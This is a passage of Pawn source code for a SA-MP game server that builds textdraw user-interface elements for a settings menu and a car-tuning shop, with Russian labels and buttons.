	TextDrawColor(TDEditor_MENU_GLOBAL[63], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[63], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[63], 408524031);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[63], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[63], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[63], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[63], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[63], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[63], 0);

	TDEditor_MENU_GLOBAL[64] = TextDrawCreate(234.899902, 160.504318, "id_игроков_в_чате");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[64], 0.137499, 0.789375);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[64], 355.808837, 1.239999);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[64], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[64], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[64], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[64], 408524031);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[64], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[64], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[64], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[64], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[64], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[64], 0);

	TDEditor_MENU_GLOBAL[65] = TextDrawCreate(234.899902, 172.105026, "чат_организации");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[65], 0.137499, 0.869373);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[65], 355.808837, 1.239999);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[65], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[65], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[65], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[65], 408524031);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[65], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[65], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[65], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[65], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[65], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[65], 0);

	TDEditor_MENU_GLOBAL[66] = TextDrawCreate(234.899902, 184.505783, "сытность_персонажа");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[66], 0.137499, 0.869373);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[66], 355.808837, 1.239999);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[66], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[66], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[66], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[66], 408524031);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[66], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[66], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[66], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[66], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[66], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[66], 0);

	TDEditor_MENU_GLOBAL[67] = TextDrawCreate(234.899902, 197.006546, "чемодан_в_руке");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[67], 0.137499, 0.869373);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[67], 355.808837, 1.239999);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[67], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[67], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[67], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[67], 408524031);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[67], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[67], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[67], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[67], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[67], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[67], 0);

	TDEditor_MENU_GLOBAL[68] = TextDrawCreate(404.202636, 123.684265, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[68], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[68], 14.000000, 11.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[68], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[68], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[68], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[68], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[68], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[68], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[68], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[68], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[68], true);

	TDEditor_MENU_GLOBAL[69] = TextDrawCreate(404.202636, 135.384643, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[69], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[69], 14.000000, 10.599987);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[69], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[69], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[69], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[69], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[69], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[69], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[69], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[69], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[69], true);

	TDEditor_MENU_GLOBAL[70] = TextDrawCreate(404.202636, 146.885345, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[70], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[70], 14.000000, 11.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[70], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[70], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[70], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[70], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[70], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[70], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[70], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[70], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[70], true);

	TDEditor_MENU_GLOBAL[71] = TextDrawCreate(404.202636, 158.486053, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[71], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[71], 14.000000, 11.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[71], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[71], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[71], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[71], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[71], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[71], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[71], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[71], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[71], true);

	TDEditor_MENU_GLOBAL[72] = TextDrawCreate(404.202636, 170.586791, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[72], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[72], 14.000000, 11.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[72], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[72], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[72], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[72], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[72], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[72], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[72], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[72], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[72], true);

	TDEditor_MENU_GLOBAL[73] = TextDrawCreate(404.202636, 182.587524, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[73], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[73], 14.000000, 11.400009);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[73], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[73], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[73], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[73], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[73], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[73], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[73], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[73], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[73], true);

	TDEditor_MENU_GLOBAL[74] = TextDrawCreate(404.202636, 195.588317, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[74], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[74], 14.000000, 11.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[74], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[74], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[74], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[74], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[74], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[74], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[74], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[74], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[74], true);

	TDEditor_MENU_GLOBAL[75] = TextDrawCreate(365.999786, 125.235679, "<");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[75], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[75], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[75], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[75], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[75], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[75], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[75], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[75], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[75], 0);

	TDEditor_MENU_GLOBAL[76] = TextDrawCreate(365.999786, 136.936187, "<");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[76], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[76], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[76], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[76], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[76], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[76], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[76], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[76], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[76], 0);

	TDEditor_MENU_GLOBAL[77] = TextDrawCreate(365.999786, 148.436889, "<");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[77], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[77], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[77], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[77], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[77], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[77], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[77], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[77], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[77], 0);

	TDEditor_MENU_GLOBAL[78] = TextDrawCreate(365.999786, 160.137603, "<");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[78], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[78], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[78], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[78], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[78], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[78], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[78], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[78], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[78], 0);

	TDEditor_MENU_GLOBAL[79] = TextDrawCreate(365.999786, 171.738311, "<");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[79], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[79], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[79], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[79], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[79], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[79], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[79], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[79], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[79], 0);

	TDEditor_MENU_GLOBAL[80] = TextDrawCreate(365.999786, 184.339080, "<");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[80], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[80], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[80], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[80], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[80], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[80], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[80], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[80], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[80], 0);

	TDEditor_MENU_GLOBAL[81] = TextDrawCreate(365.999786, 196.239807, "<");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[81], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[81], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[81], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[81], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[81], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[81], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[81], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[81], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[81], 0);

	TDEditor_MENU_GLOBAL[82] = TextDrawCreate(411.602569, 125.235679, ">");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[82], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[82], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[82], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[82], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[82], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[82], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[82], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[82], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[82], 0);

	TDEditor_MENU_GLOBAL[83] = TextDrawCreate(411.602569, 136.936187, ">");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[83], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[83], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[83], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[83], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[83], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[83], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[83], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[83], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[83], 0);

	TDEditor_MENU_GLOBAL[84] = TextDrawCreate(411.602569, 148.436889, ">");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[84], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[84], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[84], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[84], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[84], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[84], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[84], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[84], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[84], 0);

	TDEditor_MENU_GLOBAL[85] = TextDrawCreate(411.602569, 160.137603, ">");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[85], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[85], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[85], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[85], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[85], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[85], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[85], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[85], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[85], 0);

	TDEditor_MENU_GLOBAL[86] = TextDrawCreate(411.602569, 171.738311, ">");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[86], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[86], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[86], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[86], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[86], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[86], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[86], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[86], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[86], 0);

	TDEditor_MENU_GLOBAL[87] = TextDrawCreate(411.602569, 184.339080, ">");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[87], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[87], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[87], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[87], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[87], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[87], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[87], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[87], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[87], 0);

	TDEditor_MENU_GLOBAL[88] = TextDrawCreate(411.602569, 196.239807, ">");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[88], 0.137499, 0.869373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[88], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[88], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[88], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[88], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[88], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[88], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[88], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[88], 0);

	TDEditor_MENU_GLOBAL[89] = TextDrawCreate(426.100708, 136.137985, "hud:radar_gangB");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[89], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[89], 59.000000, 56.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[89], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[89], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[89], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[89], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[89], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[89], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[89], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[89], 0);

	sto_td_global[26] = TextDrawCreate(569.524780, 173.653549, "cromulent:tuning_car");
	TextDrawLetterSize(sto_td_global[26], 0.000000, 0.000000);
	TextDrawTextSize(sto_td_global[26], 65.904769, 123.306716);
	TextDrawAlignment(sto_td_global[26], 1);
	TextDrawColor(sto_td_global[26], -1);
	TextDrawSetShadow(sto_td_global[26], 0);
	TextDrawSetOutline(sto_td_global[26], 0);
	TextDrawFont(sto_td_global[26], 4);

	sto_td_global[27] = TextDrawCreate(449.142730, 173.653320, "cromulent:tuning_car2");
	TextDrawLetterSize(sto_td_global[27], 0.000000, 0.000000);
	TextDrawTextSize(sto_td_global[27], 116.952560, 124.160003);
	TextDrawAlignment(sto_td_global[27], 1);
	TextDrawColor(sto_td_global[27], -1);
	TextDrawSetShadow(sto_td_global[27], 0);
	TextDrawSetOutline(sto_td_global[27], 0);
	TextDrawFont(sto_td_global[27], 4);

	sto_td_global[0] = TextDrawCreate(468.800170, 263.775878, "<"); // second block > button back
	TextDrawLetterSize(sto_td_global[0], 0.130097, 0.800875);
	TextDrawTextSize(sto_td_global[0], 10.000000, 5.880000);
	TextDrawAlignment(sto_td_global[0], 2);
	TextDrawColor(sto_td_global[0], 582081535);
	TextDrawUseBox(sto_td_global[0], true);
	TextDrawBoxColor(sto_td_global[0], -1);
	TextDrawSetShadow(sto_td_global[0], 0);
	TextDrawSetOutline(sto_td_global[0], 0);
	TextDrawBackgroundColor(sto_td_global[0], 51);
	TextDrawFont(sto_td_global[0], 2);
	TextDrawSetProportional(sto_td_global[0], 1);
	TextDrawSetSelectable(sto_td_global[0], true);

	sto_td_global[1] = TextDrawCreate(550.000427, 263.775878, ">"); // second block > button next
	TextDrawLetterSize(sto_td_global[1], 0.130097, 0.800875);
	TextDrawTextSize(sto_td_global[1], 10.000000, 5.880000);
	TextDrawAlignment(sto_td_global[1], 2);
	TextDrawColor(sto_td_global[1], 582081535);
	TextDrawUseBox(sto_td_global[1], true);
	TextDrawBoxColor(sto_td_global[1], -1);
	TextDrawSetShadow(sto_td_global[1], 0);
	TextDrawSetOutline(sto_td_global[1], 0);
	TextDrawBackgroundColor(sto_td_global[1], 51);
	TextDrawFont(sto_td_global[1], 2);
	TextDrawSetProportional(sto_td_global[1], 1);
	TextDrawSetSelectable(sto_td_global[1], true);

	sto_td_global[2] = TextDrawCreate(489.900604, 263.719879, "основн."); // second block > button first type
	TextDrawLetterSize(sto_td_global[2], 0.130097, 0.800875);
	TextDrawTextSize(sto_td_global[2], 10.000000, 24.808006);
	TextDrawAlignment(sto_td_global[2], 2);
	TextDrawColor(sto_td_global[2], 582081535);
	TextDrawUseBox(sto_td_global[2], true);
	TextDrawBoxColor(sto_td_global[2], -1);
	TextDrawSetShadow(sto_td_global[2], 0);
	TextDrawSetOutline(sto_td_global[2], 0);
	TextDrawBackgroundColor(sto_td_global[2], 51);
	TextDrawFont(sto_td_global[2], 2);
	TextDrawSetProportional(sto_td_global[2], 1);
	TextDrawSetSelectable(sto_td_global[2], true);

	sto_td_global[3] = TextDrawCreate(528.900634, 263.719879, "дополн."); // second block > button second type
	TextDrawLetterSize(sto_td_global[3], 0.130097, 0.800875);
	TextDrawTextSize(sto_td_global[3], 10.000000, 24.808006);
	TextDrawAlignment(sto_td_global[3], 2);
	TextDrawColor(sto_td_global[3], 582081535);
	TextDrawUseBox(sto_td_global[3], true);
	TextDrawBoxColor(sto_td_global[3], -1);
	TextDrawSetShadow(sto_td_global[3], 0);
	TextDrawSetOutline(sto_td_global[3], 0);
	TextDrawBackgroundColor(sto_td_global[3], 51);
	TextDrawFont(sto_td_global[3], 2);
	TextDrawSetProportional(sto_td_global[3], 1);
	TextDrawSetSelectable(sto_td_global[3], true);

	sto_td_global[6] = TextDrawCreate(577.523803, 212.906661, "cromulent:white");
	TextDrawLetterSize(sto_td_global[6], 0.000000, 0.000000);
	TextDrawTextSize(sto_td_global[6], 50.285705, 15.786666);
	TextDrawAlignment(sto_td_global[6], 1);
	TextDrawColor(sto_td_global[6], -1);
	TextDrawSetShadow(sto_td_global[6], 0);
	TextDrawSetOutline(sto_td_global[6], 0);
	TextDrawFont(sto_td_global[6], 4);
	TextDrawSetSelectable(sto_td_global[6], true);

/*	sto_td_global[9] = TextDrawCreate(608.400329, 192.319839, "гидравлика"); // hydraulics > selectable text
	TextDrawLetterSize(sto_td_global[9], 0.146197, 0.939755);
	TextDrawTextSize(sto_td_global[9], 10.000000, 68.039993);
	TextDrawAlignment(sto_td_global[9], 2);
	TextDrawColor(sto_td_global[9], -1);
	TextDrawUseBox(sto_td_global[9], true);
	TextDrawBoxColor(sto_td_global[9], 582081535);
	TextDrawSetShadow(sto_td_global[9], 0);
	TextDrawSetOutline(sto_td_global[9], 0);
	TextDrawBackgroundColor(sto_td_global[9], 51);
	TextDrawFont(sto_td_global[9], 2);
	TextDrawSetProportional(sto_td_global[9], 1);
	TextDrawSetSelectable(sto_td_global[9], true);

	sto_td_global[12] = TextDrawCreate(608.400329, 206.991775, "нитро"); // nitro > selectable box
	TextDrawLetterSize(sto_td_global[12], 0.146197, 0.939755);
	TextDrawTextSize(sto_td_global[12], 10.000000, 68.039993);
	TextDrawAlignment(sto_td_global[12], 2);
	TextDrawColor(sto_td_global[12], -1);
	TextDrawUseBox(sto_td_global[12], true);
	TextDrawBoxColor(sto_td_global[12], 582081535);
	TextDrawSetShadow(sto_td_global[12], 0);
	TextDrawSetOutline(sto_td_global[12], 0);
	TextDrawBackgroundColor(sto_td_global[12], 51);
	TextDrawFont(sto_td_global[12], 2);
	TextDrawSetProportional(sto_td_global[12], 1);
	TextDrawSetSelectable(sto_td_global[12], true); */

	sto_td_global[15] = TextDrawCreate(577.523803, 192.000000, "cromulent:white"); //Диски
	TextDrawLetterSize(sto_td_global[15], 0.000000, 0.000000);
	TextDrawTextSize(sto_td_global[15], 49.904785, 14.933334);
	TextDrawAlignment(sto_td_global[15], 1);
	TextDrawColor(sto_td_global[15], -1);
	TextDrawSetShadow(sto_td_global[15], 0);
	TextDrawSetOutline(sto_td_global[15], 0);
	TextDrawFont(sto_td_global[15], 4);
	TextDrawSetSelectable(sto_td_global[15], true);

	sto_td_global[18] = TextDrawCreate(577.904785, 234.666687, "cromulent:white"); //винилы
	TextDrawLetterSize(sto_td_global[18], 0.000000, 0.000000);
	TextDrawTextSize(sto_td_global[18], 49.523803, 15.359970);
	TextDrawAlignment(sto_td_global[18], 1);
	TextDrawColor(sto_td_global[18], -1);
	TextDrawSetShadow(sto_td_global[18], 0);
	TextDrawSetOutline(sto_td_global[18], 0);
	TextDrawFont(sto_td_global[18], 4);
	TextDrawSetSelectable(sto_td_global[18], true);

	sto_td_global[21] = TextDrawCreate(577.904724, 255.146697, "cromulent:white"); //Ремонт
	TextDrawLetterSize(sto_td_global[21], 0.000000, 0.000000);
	TextDrawTextSize(sto_td_global[21], 50.666625, 14.506652);
	TextDrawAlignment(sto_td_global[21], 1);
	TextDrawColor(sto_td_global[21], -1);
	TextDrawSetShadow(sto_td_global[21], 0);
	TextDrawSetOutline(sto_td_global[21], 0);
	TextDrawFont(sto_td_global[21], 4);
	TextDrawSetSelectable(sto_td_global[21], true);

	sto_td_global[24] = TextDrawCreate(577.142883, 273.919982, "cromulent:white"); //stage
	TextDrawLetterSize(sto_td_global[24], 0.000000, 0.000000);
	TextDrawTextSize(sto_td_global[24], 51.047546, 15.360015);
	TextDrawAlignment(sto_td_global[24], 1);
	TextDrawColor(sto_td_global[24], -1);
	TextDrawSetShadow(sto_td_global[24], 0);
	TextDrawSetOutline(sto_td_global[24], 0);
	TextDrawFont(sto_td_global[24], 4);
	TextDrawSetSelectable(sto_td_global[24], true);

	sto_td_global[25] = TextDrawCreate(509.300537, 280.183807, "купить"); // second block > detail
	TextDrawLetterSize(sto_td_global[25], 0.130097, 0.800875);
	TextDrawTextSize(sto_td_global[25], 10.050000, 63.056007);
	TextDrawAlignment(sto_td_global[25], 2);
	TextDrawColor(sto_td_global[25], 582081535);
	TextDrawUseBox(sto_td_global[25], true);
